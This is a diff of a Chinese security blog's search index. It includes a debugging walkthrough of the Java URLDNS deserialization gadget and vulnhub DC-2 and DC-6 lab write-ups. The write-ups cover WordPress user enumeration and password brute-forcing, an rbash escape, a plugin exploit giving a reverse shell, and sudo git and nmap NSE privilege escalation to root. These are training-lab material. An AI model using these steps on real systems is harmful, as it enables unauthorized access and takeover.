class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>URLStreamHandler</code>还没有分析过作用，</p>
-<p>先引入p神博客上的说明</p>
-<blockquote>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">首先：URLStreamHandler，引用别人对这个类的理解。</span><br></pre></td></tr></table></figure>
-
-<p>   一般而言， URL 的格式是： protocol://[authority]hostname:port/resource?queryString 。 URL 类能够解析出 protocol、 hostname 、 port 等信息。 Protocol 决定了交互规范，通用的协议，比如 HTTP 、 File 、 FTP 等协议， JDK 自带了默认的通讯实现。当然，自定义实现是允许的。 Hostname 和 port 一般用于 Socket 或者基于 Socket 其他协议通讯方式。Resource 即资源上下文。可能读者利用 URL ，通过指定协议（ protocol ）来获取指定资源的读写，比如 JDK 内置了HTTP 、 File 、 FTP 等协议的处理方法。</p>
-<p>   在成功地构造 URL 实例之后， URL API 中定义了一个 openConnection() 方法，返回一个 java.net.URLConnection 抽象类型的实例。不过，这里 URL 对象是代理对象，实际调用的是， java.net.URLStreamHandler 对象的 openConnection() 方法。</p>
-<p>　　我觉得可以理解为URLStreamHandler handler = new SilentURLStreamHandler();是初始化一个方法，到时候你的URL实例会根据这个类方法调用不同的操作。openConnection和getHostAddress是可以自定义的，说明协议可以自定义，自定义的协议做自定义的操作</p>
-</blockquote>
-<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><ul>
-<li><p>MacOs(10.15.7)</p>
-</li>
-<li><p>Java(jdk 1.8)</p>
-<blockquote>
-<p>必须是 1.8 以后，因为在1.8 以前HashMap.readObject() 方法中没有调用 HashMap.putVal() 方法，触发不了gadget</p>
-</blockquote>
-</li>
-</ul>
-<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>每一个gadget的java类中都自带一个<code>main</code>方法，使用<code>PayloadRunner</code>执行这个payload，所以直接使用这个进行调试，在<code>PayloadRunner</code>中，有一个<code>Command</code>，即需要执行的命令。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102512107.png" alt="image-20201118102512107"></p>
-<p>默认的<code>command</code>是调用<code>calc.exe</code></p>
-<p>由于本gadget是不能进行命令执行，只能进行一次DNS查询，所以需要对<code>command</code>进行赋值，这里在免费的<code>http://www.dnslog.cn/</code>请求一个子域名</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102845625.png" alt="image-20201118102845625"></p>
-<p>用这个子域名赋值<code>command</code></p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// write by my self</span></span><br><span class="line">    String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">    PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>值得一提的是，上述<code>command</code>中的<code>http://</code>不能省略，因为在<code>getObject() -&gt; new URL()</code>的时候，会把<code>command</code>传入参数，在构造方法里，判断了协议</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = start ; !aRef &amp;&amp; (i &lt; limit) &amp;&amp;</span><br><span class="line">                     ((c = spec.charAt(i)) != <span class="string">&#x27;/&#x27;</span>) ; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        String s = spec.substring(start, i).toLowerCase();</span><br><span class="line">        <span class="keyword">if</span> (isValidProtocol(s)) &#123;</span><br><span class="line">            newProtocol = s;</span><br><span class="line">            start = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果省略协议，则会抛出异常</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (protocol == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;no protocol: &quot;</span>+original);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>在<code>HashMap.ReadObject()</code>处下断点，运行到<code>putVal</code>处，</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118104047928.png" alt="image-20201118104047928"></p>
-<p>跟进<code>hash(key)</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>key.hashCode()</code>会调用<code>URL.hashCode()</code>方法</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后会调用<code>handler.hashCode(this)</code>，这个<code>handler</code>是一个<code>URLStreamHandler</code>类对象</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">   ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>看到<code>getHostAddress()</code>，这个函数中</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>调用了一个<code>InetAddress.getByName(host)</code>方法，顾名思义，这个方法是发起一次DNS请求，解析目标域名。</p>
-<p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118105831277.png" alt="image-20201118105831277"></p>
-<p>到这里，这个利用链已经调试结束，利用链不长。</p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ul>
-<li>这个利用链只有<code>dns请求</code>，可以用作检测目标是否存在反序列化漏洞。</li>
-</ul>
 ]]></content>
       <categories>
         <category>JavaWeb</category>
@@ -356,40 +284,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub DC-2靶机</title>
-    <url>//DC-2.html</url>
-    <content><![CDATA[<p>vulnhub里的 DC-2 靶机</p>
-<p>初学者难度</p>
-<a id="more"></a>
-
-
-
-<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-2,311/">vulnhub-DC2</a></p>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>不知道为什么,下载完成之后并没有主动获得IP地址,而且网课接口名称也是对的.<br>后来将<code>桥接</code>改为<code>NAT</code>之后就可以了</p>
-<h2 id="1-NMAP-扫描"><a href="#1-NMAP-扫描" class="headerlink" title="1. NMAP 扫描"></a>1. NMAP 扫描</h2><p>在<code>kali</code>机上查看ip地址<code>ifconfig</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-2# ifconfig</span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.147.130  netmask 255.255.255.0  broadcast 192.168.147.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe2a:621f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:2a:62:1f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 175293  bytes 110023189 (104.9 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 150846  bytes 13877594 (13.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
-<p>得到本机ip地址为<code>192.168.147.130</code>所以靶机的ip在<code>192.168.147.0/24</code>网段<br>使用<code>nmap</code>工具扫描网段,发现主机<br><code>nmap 192.168.147.0/24</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for dc-2 (192.168.147.131)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:7C:97:D6 (VMware)</span><br></pre></td></tr></table></figure>
-<p>得到了靶机的ip地址为<code>192.168.147.131</code>,并且在0-1000端口只开启了<code>80端口(http)</code><br>进行更加深度的扫描<code>nmap -A 192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"></a><br>是一个<code>WordPress</code>的模板</p>
-<h2 id="2-访问网站"><a href="#2-访问网站" class="headerlink" title="2. 访问网站"></a>2. 访问网站</h2><h3 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h3><p>从上面扫描到的信息可以看到,想要访问网站,只能通过<code>http://dc-2</code>,因此需要修改<code>hosts</code>文件,将<code>http://dc-2</code>解析到<code>192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-e1586177580223.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172286546-300x74.png"></a><br>看到是一个<code>WordPress</code>和第一个<code>flag</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-e1586177605680.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172400798-300x91.png"></a><br><code>flag</code>内容如下<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586172423639.png" alt="file"></p>
-<h3 id="爆破WordPress"><a href="#爆破WordPress" class="headerlink" title="爆破WordPress"></a>爆破WordPress</h3><p>通常的密码字典不一定管用,推荐了<a href="https://www.freebuf.com/articles/network/190128.html">cewl</a><br>根据链接的教程创建字典<br><code>cewl http://dc-2 -w dc2_password</code><br>有了密码字典还需要用户名啊,这里使用<a href="https://www.freebuf.com/sectool/174663.html">wpscan</a><br><code>wpscan --url http://dc-2 --enumerate u</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173208850-e1586177690710.png"></a></p>
-<p>扫描出来三个用户名,使用<code>wpscan</code>进行爆破<br><code>wpscan --url http://dc-2 -U jerry(tom) -P dc2_password</code><br>Tom 和 Jerry 的密码都是可以爆出来的,admin不行<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173679186.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173729041.png" alt="file"><br>得到密码之后用Jerry的账户登录进入后台,得到第二个flag<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173819297.png" alt="file"></p>
-<p>然后提示,用另外的登录口<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586173840215.png" alt="file"></p>
-<h2 id="另外的登录口"><a href="#另外的登录口" class="headerlink" title="另外的登录口"></a>另外的登录口</h2><p>看来是扫描不到位,错过了一些端口,<br><code>nmap -A 192.168.147.131 -p0-65535</code>,进行端口全扫描<br>扫出来一个<code>ssh</code>端口<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174130881-e1586177777434.png"></a><br>使用Tom的账号登录靶机<br><code>ssh tom@192.168.147.131 -p 7744</code><br>发现<code>cat</code>命令被屏蔽了<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174238395.png" alt="file"><br>查看一下<code>PATH</code>和<code>PATH</code>里面的命令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174279706.png" alt="file"><br>用<code>vi flag*</code>得到第三个flag</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes</span><br></pre></td></tr></table></figure>
-<h3 id="切换到jerry"><a href="#切换到jerry" class="headerlink" title="切换到jerry"></a>切换到jerry</h3><p>提示需要用Jerry的账户去提权,尝试切换到Jerry的账户<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174360078.png" alt="file"><br>what?没有su?在看了一眼,嗯?rbash?<a href="https://www.howtoing.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/">查找资料</a>,是一个受限的shell,这里屏蔽了<code>/</code>,知识受限,找资料,绕过rbash的办法<br>在<code>vi</code>里面创建一个shell (????)<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174741956.png" alt="file"><br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174752874.png" alt="file"><br>得到shell之后,把环境变量加进去<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174807890.png" alt="file"><br>然后就可以切换账户了<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177809142.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586174875420-e1586177937925.png"></a><br>最后的提示是用<code>git</code>提权 (????)</p>
-<p>先看看拥有root权限的指令<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177847302.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175456005-e1586177925972.png"></a><br>git是不用root密码的,所以真的要用git提权<br>找资料<br><code>sudo git -p help config</code> 然后输入 <code>/bin/bash</code> 就可以得到root权限的shell,拿到最后一个flag<br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586175578057-e1586177903521.png"></a></p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>DC</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>wordpress</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub DC-3靶机</title>
     <url>//DC-3.html</url>
     <content><![CDATA[<p>vulnhub里的 DC-3 靶机</p>
@@ -449,46 +343,30 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub DC-6靶机</title>
-    <url>//DC-6.html</url>
-    <content><![CDATA[<p>vulnhub里的 DC-6 靶机</p>
+    <title>vulnhub DC-2靶机</title>
+    <url>//DC-2.html</url>
+    <content><![CDATA[<p>vulnhub里的 DC-2 靶机</p>
 <p>初学者难度</p>
 <a id="more"></a>
 
-<h3 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h3><p><a href="https://www.vulnhub.com/entry/dc-6,315/">vulnhub DC-6</a></p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP"><a href="#NMAP扫描得到IP" class="headerlink" title="NMAP扫描得到IP"></a>NMAP扫描得到IP</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for wordy (192.168.147.135)</span><br><span class="line">Host is up (0.00080s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure>
-<p>详细扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.135 -A -p0-65535</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.135</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 79 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">MAC Address: 00:0C:29:C1:80:5F (VMware)</span><br></pre></td></tr></table></figure>
-<p>需要修改<code>hosts</code>文件访问<code>http://wordy</code><br>然后就可以访问网站了</p>
-<h3 id="针对WordPress的攻击"><a href="#针对WordPress的攻击" class="headerlink" title="针对WordPress的攻击"></a>针对WordPress的攻击</h3><p>使用<code>wpscan</code>工具扫描用户名</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy --enumerate u</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
-<p>扫描出来的用户名,加上作者给的提示</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OK, this isn&#39;t really a clue as such, but more of some &quot;we don&#39;t want to spend five years waiting for a certain process to finish&quot; kind of advice for those who just want to get on with the job.</span><br><span class="line"></span><br><span class="line">cat &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</span><br></pre></td></tr></table></figure>
-<p>创建好字典之后爆破</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy -U user -P password.txt</span><br><span class="line"></span><br><span class="line">[SUCCESS] - mark / helpdesk01</span><br></pre></td></tr></table></figure>
-<p>使用<code>mark</code>的账户登录进去<br>查看一下,没有可以挂马的地方啊???<br><a href="https://cloud.tencent.com/developer/article/1472276">师傅的WP</a>上说<code>activity monitor</code> 存在漏洞,用<code>searchsploit</code>查一下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">searchsploit activity monitor</span><br><span class="line"></span><br><span class="line">WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Comm | exploits/php/webapps/45274.html</span><br></pre></td></tr></table></figure>
-<p>改一下参数就可以执行一个反弹shell</p>
-<h3 id="提权到graham"><a href="#提权到graham" class="headerlink" title="提权到graham"></a>提权到graham</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/vulnhub/dc-6# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.135] 49302</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
-<p>看一下用户目录和里面的东西,在<code>/home/mark/stuff/</code>里面找到一个备忘录?</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home/mark/stuff -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .</span><br><span class="line">drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..</span><br><span class="line">-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt</span><br></pre></td></tr></table></figure>
-<p>里面直接写了用户名密码(…)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat things*</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br></pre></td></tr></table></figure>
-<p>用ssh连接上去</p>
-<h3 id="提权到jens"><a href="#提权到jens" class="headerlink" title="提权到jens"></a>提权到jens</h3><p>查看一下可以提权的程序</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
-<p>看一下这个文件的权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al /home/jens</span><br><span class="line"></span><br><span class="line">-rwxrwxr-x 1 jens devs   61 Apr  9 16:37 backups.sh</span><br></pre></td></tr></table></figure>
-<p>居然可写,那就把它里面改成<code>/bin/bash</code>,就能得到一个<code>jens</code>的shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ cat backups.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tar -czf backups.tar.gz /var/www/html</span></span><br><span class="line">/bin/bash</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line">jens@dc-6:~$ whoami</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>
 
-<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>继续找能够提权的玩意</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>
-<p>nmap 怎么提权啊?师傅的WP上面说用<code>nse</code>提权,所以创建一个脚本文件就行</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ cat rooter </span><br><span class="line">os.execute(&quot;/bin/sh&quot;);</span><br><span class="line">jens@dc-6:~$ sudo nmap localhost --script=rooter</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-09 17:22 AEST</span><br><span class="line">NSE: Warning: Loading &#x27;rooter&#x27; -- the recommended file extension is &#x27;.nse&#x27;.</span><br><span class="line"><span class="meta">#</span><span class="bash"> root</span></span><br></pre></td></tr></table></figure>
-<p>这个终端不会有回显自己的字符,用<code>reset</code>命令重置终端就正常了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">root@dc-6:/home/jens# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-6:/home/jens# cat /root/</span><br><span class="line">.bash_history   .mysql_history  .profile        </span><br><span class="line">.bashrc         .nano/          theflag.txt     </span><br><span class="line">root@dc-6:/home/jens# cat /root/theflag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
+
+<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-2,311/">vulnhub-DC2</a></p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>不知道为什么,下载完成之后并没有主动获得IP地址,而且网课接口名称也是对的.<br>后来将<code>桥接</code>改为<code>NAT</code>之后就可以了</p>
+<h2 id="1-NMAP-扫描"><a href="#1-NMAP-扫描" class="headerlink" title="1. NMAP 扫描"></a>1. NMAP 扫描</h2><p>在<code>kali</code>机上查看ip地址<code>ifconfig</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:&#x2F;home&#x2F;kali&#x2F;vulnhub&#x2F;dc-2# ifconfig</span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.147.130  netmask 255.255.255.0  broadcast 192.168.147.255</span><br><span class="line">        inet6 fe80::20c:29ff:fe2a:621f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:2a:62:1f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 175293  bytes 110023189 (104.9 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 150846  bytes 13877594 (13.2 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
+<p>得到本机ip地址为<code>192.168.147.130</code>所以靶机的ip在<code>192.168.147.0/24</code>网段<br>使用<code>nmap</code>工具扫描网段,发现主机<br><code>nmap 192.168.147.0/24</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap scan report for dc-2 (192.168.147.131)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80&#x2F;tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:7C:97:D6 (VMware)</span><br></pre></td></tr></table></figure>
+<p>得到了靶机的ip地址为<code>192.168.147.131</code>,并且在0-1000端口只开启了<code>80端口(http)</code><br>进行更加深度的扫描<code>nmap -A 192.168.147.131</code><br><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586170890725-e1586177529774.png"></a><br>是一个<code>WordPress</code>的模板</p>
